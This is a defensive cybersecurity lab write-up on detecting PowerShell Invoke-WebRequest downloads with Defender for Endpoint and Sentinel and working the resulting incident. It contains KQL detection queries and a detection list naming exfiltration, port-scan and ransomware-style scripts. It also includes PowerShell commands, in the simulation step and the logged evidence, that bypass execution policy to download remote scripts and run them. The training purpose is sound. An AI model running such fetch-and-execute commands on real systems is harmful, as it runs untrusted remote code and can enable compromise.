# 🧪 Threat Detection & Incident Response Lab: PowerShell Suspicious Web Request

This lab walks through the lifecycle of a detection and response scenario where PowerShell is used to download scripts from a remote server using `Invoke-WebRequest`. The goal is to detect, investigate, and respond using Microsoft Defender for Endpoint (MDE), Microsoft Sentinel, and the NIST 800-61 Incident Response framework.

---

## 🌟 Objective

* Detect suspicious PowerShell use for remote file downloads
* Simulate the activity on an MDE-onboarded host
* Configure a detection rule in Microsoft Sentinel
* Investigate alerts and associated artifacts
* Perform containment, remediation, and reporting actions

---

## 🧰 Preparation

Attackers commonly use legitimate tools like PowerShell to evade detection, leveraging commands such as `Invoke-WebRequest` to download payloads. This technique is part of **LOLBins** (Living Off the Land Binaries). In this lab, we simulate such behavior by downloading `eicar.ps1` (a harmless test file).

Defender for Endpoint detects the behavior and sends telemetry to Microsoft Sentinel for detection and response.

---

## 🛡️ Create Alert Rule: Suspicious PowerShell Web Request

### 🔍 Detection Context

`Invoke-WebRequest` is frequently abused by attackers to:

* Download malicious files or scripts
* Execute payloads post-compromise
* Communicate with external infrastructure (C2)

### 📊 Detection Pipeline

1. **MDE logs** PowerShell activity in `DeviceProcessEvents`
2. Logs are **forwarded to Sentinel** via Log Analytics
3. A **scheduled alert rule** in Sentinel detects the behavior

---

### 🔧 Step-by-Step Detection Setup

#### 1️⃣ Query Defender Logs

Run the following in Log Analytics Workspace to locate `Invoke-WebRequest` usage:

```kql
let TargetDevice = "nessa-windows";
DeviceProcessEvents
| where DeviceName == TargetDevice
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "Invoke-WebRequest"
```

Verify payload detection:

```kql
let TargetHostname = "nessa-windows";
let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]);
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| summarize Count = count() by AccountName, DeviceName, FileName, ProcessCommandLine
```

![Defender Screenshot](https://github.com/user-attachments/assets/49202b3e-736c-411e-8a46-67f60c431387)

#### 2️⃣ Create Alert Rule in Sentinel

1. Go to **Microsoft Sentinel > Analytics > Create > Scheduled Query Rule**
2. Fill in:

   * **Name**: PowerShell Suspicious Web Request
   * **Description**: Detects PowerShell downloading remote files
   * **KQL**:

```kql
let TargetDevice = "nessa-windows";
DeviceProcessEvents
| where DeviceName == TargetDevice
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "Invoke-WebRequest"
```

3. Set:

   * **Frequency**: Every 4 hours
   * **Lookup Period**: Last 24 hours
4. **Entity Mapping**: `AccountName`, `DeviceName`, `ProcessCommandLine`
5. **MITRE Tactic**: Command and Scripting Interpreter: PowerShell / Execution
6. Enable and save the rule

![Sentinel Screenshot](https://github.com/user-attachments/assets/2c2e0d75-aa67-4ffc-a5ed-ffe30393d388)

---

### 💣 Simulate Attack — Triggering the Alert

To generate log activity and trigger an alert in Sentinel, run the following PowerShell commands on the onboarded VM (`nessa-windows`):

```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1' -OutFile 'C:\programdata\eicar.ps1';
powershell.exe -ExecutionPolicy Bypass -File 'C:\programdata\eicar.ps1';
```

---

## 🛠️ Work the Incident (NIST 800-61 Lifecycle)

### 1️⃣ Preparation

* Confirm access, tooling, and training are in place

### 2️⃣ Detection & Analysis

* Assign the incident and mark it **Active**
* Investigate:

![Sentinel Screenshot](https://github.com/user-attachments/assets/7d589184-9fd1-479c-ba26-9a5adb092896)

* Identify scripts and commands:

*  Check PowerShell commands:
     ```plaintext
     powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
     powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1
     powershell.exe" -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1
     powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1
     ```
Scripts executed:

* `portscan.ps1`
* `pwncrypt.ps1`
* `eicar.ps1`
* `exfiltratedata.ps1`

Gather evidence:

* Scripts downloaded and executed 🧪.
* User admitted to downloading free software during the events

### 3️⃣ Containment & Recovery

* Isolate host using MDE
* Run Defender scans
* Remove malicious files and validate system integrity

### 4️⃣ Post-Incident

* Log all scripts executed
* Note user involved (`BigMomma`)
* Update PowerShell usage policies
* Provide staff security training
* Mark incident **True Positive** and close

---

## 📍 Incident Summary

| **Metric**          | **Value**                                                         |
| ------------------- | ----------------------------------------------------------------- |
| Affected Device     | `nessa-windows`                                                |
| Suspicious Commands | 4                                                                 |
| Scripts Downloaded  | `portscan.ps1`, `pwncrypt.ps1`, `eicar.ps1`, `exfiltratedata.ps1` |
| Incident Status     | Resolved                                                          |

---

🎉 **Well done on completing the lab and securing your endpoint!** 🔐
